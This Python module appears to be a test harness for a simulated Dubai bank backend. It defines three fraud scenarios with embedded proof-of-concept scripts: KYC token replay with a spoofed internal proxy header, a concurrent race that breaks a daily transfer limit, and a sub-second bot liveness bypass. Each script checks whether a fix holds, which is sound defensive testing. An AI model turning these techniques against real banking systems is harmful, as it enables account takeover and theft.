"""Realistic 2:00 AM Dubai banking intrusion scenarios and executable exploit payloads."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any


@dataclass(frozen=True)
class AttackScenario:
    id: str
    name: str
    subtitle: str
    dubai_time: str
    local_hour_dubai: int
    target_account_id: str
    session_id: str
    amount_aed: float
    beneficiary_iban: str
    attacker_ip: str
    attacker_country: str
    device_fp: str
    trusted_proxy_header: str | None
    kyc_token: str
    concurrent_requests: int
    vulnerable_file: str
    vulnerable_symbol: str
    cwe: str
    ttp_tags: tuple[str, ...]
    exploit_script: str

    def to_summary(self) -> dict[str, Any]:
        return {
            "id": self.id,
            "name": self.name,
            "subtitle": self.subtitle,
            "dubai_time": self.dubai_time,
            "target_account_id": self.target_account_id,
            "amount_aed": self.amount_aed,
            "beneficiary_iban": self.beneficiary_iban,
            "vulnerable_file": self.vulnerable_file,
            "vulnerable_symbol": self.vulnerable_symbol,
            "cwe": self.cwe,
            "ttp_tags": list(self.ttp_tags),
        }


EXPLOIT_KYC_REPLAY = '''"""Exploit PoC: 2:00 AM KYC Token Replay + Scope Bypass (CWE-294)."""
import sys
from backend.bank.ledger import BankLedger
from backend.bank.kyc import KYCService
from backend.bank.transfers import process_wire_request

ledger = BankLedger()
kyc = KYCService()
before = ledger.get_account("acc_tariq_001").balance_aed
print(f"[EXPLOIT] Target acc_tariq_001 initial balance: AED {before:,.2f}")
print("[EXPLOIT] Replaying daytime AED 420 DEWA KYC token for AED 250,000 offshore wire...")

try:
    res = process_wire_request(
        ledger,
        kyc,
        session_id="sess_tariq_live",
        device_fp="fp_kali_tor_exit_09",
        ip_address="185.220.101.47",
        country="NL",
        local_hour_dubai=2,
        kyc_token="kyc_tok_tariq_daytime_9821",
        beneficiary_iban="CY17002001280000001200527600",
        amount_aed=250_000.00,
        trusted_proxy_header="X-Internal-Gateway: spoofed",
        simulate_io_delay_s=0.0,
    )
    after = ledger.get_account("acc_tariq_001").balance_aed
    print(f"[EXPLOIT] BREACH SUCCESS! TX={res['transfer']['tx_id']} drained AED {before - after:,.2f} (remaining: AED {after:,.2f})")
    sys.exit(0)  # Exit 0 means exploit succeeded (VULNERABLE!)
except Exception as exc:
    after = ledger.get_account("acc_tariq_001").balance_aed
    print(f"[EXPLOIT] BLOCKED: {type(exc).__name__}: {exc} (balance intact: AED {after:,.2f})")
    sys.exit(42)  # Exit 42 means exploit blocked (PATCHED!)
'''

EXPLOIT_RACE_DRAIN = '''"""Exploit PoC: Concurrent TOCTOU Transfer Race Condition (CWE-362)."""
import sys
from concurrent.futures import ThreadPoolExecutor
from backend.bank.ledger import BankLedger
from backend.bank.kyc import KYCService
from backend.bank.transfers import execute_transfer

ledger = BankLedger()
kyc = KYCService()
before = ledger.get_account("acc_nadia_002").balance_aed
limit = ledger.get_account("acc_nadia_002").daily_limit_aed
print(f"[EXPLOIT] Target acc_nadia_002 balance: AED {before:,.2f}, daily_limit: AED {limit:,.2f}")
print("[EXPLOIT] Firing 4 concurrent AED 45,000 transfers (total AED 180,000 > AED 50,000 limit)...")

def fire(i):
    tok = kyc.issue_kyc_token("acc_nadia_002", 45_000.00, "CY17002001280000001200527600", completion_ms=2200)
    res = kyc.verify_kyc_token(tok.token, "acc_nadia_002", 45_000.00, "CY17002001280000001200527600")
    return execute_transfer(ledger, "acc_nadia_002", "CY17002001280000001200527600", 45_000.00, res, simulate_io_delay_s=0.04)

succeeded = 0
with ThreadPoolExecutor(max_workers=4) as pool:
    futs = [pool.submit(fire, i) for i in range(4)]
    for f in futs:
        try:
            f.result()
            succeeded += 1
        except Exception as exc:
            print(f"[EXPLOIT] Thread rejected: {exc}")

spent = ledger.get_account("acc_nadia_002").daily_spent_aed
print(f"[EXPLOIT] {succeeded}/4 transfers succeeded; total spent AED {spent:,.2f} vs limit AED {limit:,.2f}")
if spent > limit:
    print("[EXPLOIT] BREACH SUCCESS! Daily limit bypassed via race condition!")
    sys.exit(0)
else:
    print("[EXPLOIT] BLOCKED: Atomic lock & daily limit held firm!")
    sys.exit(42)
'''

EXPLOIT_BOT_KYC = '''"""Exploit PoC: Sub-Second Automated Bot KYC Liveness Bypass."""
import sys
from backend.bank.ledger import BankLedger
from backend.bank.kyc import KYCService
from backend.bank.transfers import process_wire_request

ledger = BankLedger()
kyc = KYCService()
before = ledger.get_account("acc_dmitry_003").balance_aed
print(f"[EXPLOIT] Target acc_dmitry_003 balance: AED {before:,.2f}")
print("[EXPLOIT] Submitting 380ms automated bot KYC liveness token for AED 95,000 offshore transfer...")

try:
    res = process_wire_request(
        ledger,
        kyc,
        session_id="sess_dmitry_live",
        device_fp="fp_headless_playwright_99",
        ip_address="91.219.236.18",
        country="RU",
        local_hour_dubai=3,
        kyc_token="kyc_tok_bot_fast_4410",
        beneficiary_iban="GE29NB0000000101904917",
        amount_aed=95_000.00,
        trusted_proxy_header="X-Internal-Gateway: bot-spoof",
        simulate_io_delay_s=0.0,
    )
    after = ledger.get_account("acc_dmitry_003").balance_aed
    print(f"[EXPLOIT] BREACH SUCCESS! Bot bypassed KYC in 380ms and drained AED {before - after:,.2f}")
    sys.exit(0)
except Exception as exc:
    after = ledger.get_account("acc_dmitry_003").balance_aed
    print(f"[EXPLOIT] BLOCKED: {type(exc).__name__}: {exc} (balance intact: AED {after:,.2f})")
    sys.exit(42)
'''

SCENARIOS: dict[str, AttackScenario] = {
    "2am_kyc_replay_ato": AttackScenario(
        id="2am_kyc_replay_ato",
        name="2:00 AM KYC Token Replay + Account Takeover",
        subtitle="Attacker spoofs proxy header (L1), replays daytime AED 420 KYC token (L2), attempts AED 250,000 offshore wire (L3)",
        dubai_time="02:04 AM GMT+4 (Dubai)",
        local_hour_dubai=2,
        target_account_id="acc_tariq_001",
        session_id="sess_tariq_live",
        amount_aed=250_000.00,
        beneficiary_iban="CY17002001280000001200527600",
        attacker_ip="185.220.101.47",
        attacker_country="NL",
        device_fp="fp_kali_tor_exit_09",
        trusted_proxy_header="X-Internal-Gateway: spoofed",
        kyc_token="kyc_tok_tariq_daytime_9821",
        concurrent_requests=1,
        vulnerable_file="backend/bank/kyc.py",
        vulnerable_symbol="verify_kyc_token",
        cwe="CWE-294: Authentication Bypass by Capture-replay",
        ttp_tags=("MITRE-T1550", "KYC-TOKEN-REPLAY", "PROXY-HEADER-SPOOF", "OFFSHORE-MULE-CY", "DORMANT-HOUR-2AM"),
        exploit_script=EXPLOIT_KYC_REPLAY,
    ),
    "race_condition_drain": AttackScenario(
        id="race_condition_drain",
        name="2:17 AM Concurrent TOCTOU Race Drain",
        subtitle="4 parallel wire threads exploit missing atomic ledger lock to blow past AED 50,000 daily limit (AED 180,000 total)",
        dubai_time="02:17 AM GMT+4 (Dubai)",
        local_hour_dubai=2,
        target_account_id="acc_nadia_002",
        session_id="sess_nadia_live",
        amount_aed=180_000.00,
        beneficiary_iban="CY17002001280000001200527600",
        attacker_ip="194.26.135.88",
        attacker_country="DE",
        device_fp="fp_async_burst_runner_v4",
        trusted_proxy_header="X-Internal-Gateway: race-spoof",
        kyc_token="kyc_tok_tariq_daytime_9821",
        concurrent_requests=4,
        vulnerable_file="backend/bank/transfers.py",
        vulnerable_symbol="execute_transfer",
        cwe="CWE-362: Concurrent Execution using Shared Resource (TOCTOU)",
        ttp_tags=("CWE-362-RACE", "DAILY-LIMIT-BYPASS", "PARALLEL-BURST-4X", "DORMANT-HOUR-2AM"),
        exploit_script=EXPLOIT_RACE_DRAIN,
    ),
    "bot_kyc_bypass": AttackScenario(
        id="bot_kyc_bypass",
        name="3:11 AM Sub-Second Bot KYC Liveness Bypass",
        subtitle="Headless automation finishes biometric KYC in 380ms and initiates AED 95,000 mule wire",
        dubai_time="03:11 AM GMT+4 (Dubai)",
        local_hour_dubai=3,
        target_account_id="acc_dmitry_003",
        session_id="sess_dmitry_live",
        amount_aed=95_000.00,
        beneficiary_iban="GE29NB0000000101904917",
        attacker_ip="91.219.236.18",
        attacker_country="RU",
        device_fp="fp_headless_playwright_99",
        trusted_proxy_header="X-Internal-Gateway: bot-spoof",
        kyc_token="kyc_tok_bot_fast_4410",
        concurrent_requests=1,
        vulnerable_file="backend/bank/kyc.py",
        vulnerable_symbol="verify_kyc_token",
        cwe="CWE-287: Improper Biometric Liveness Timing Validation",
        ttp_tags=("AUTOMATED-KYC-BOT", "SUBSECOND-LIVENESS-380MS", "OFFSHORE-MULE-GE", "DORMANT-HOUR-3AM"),
        exploit_script=EXPLOIT_BOT_KYC,
    ),
}
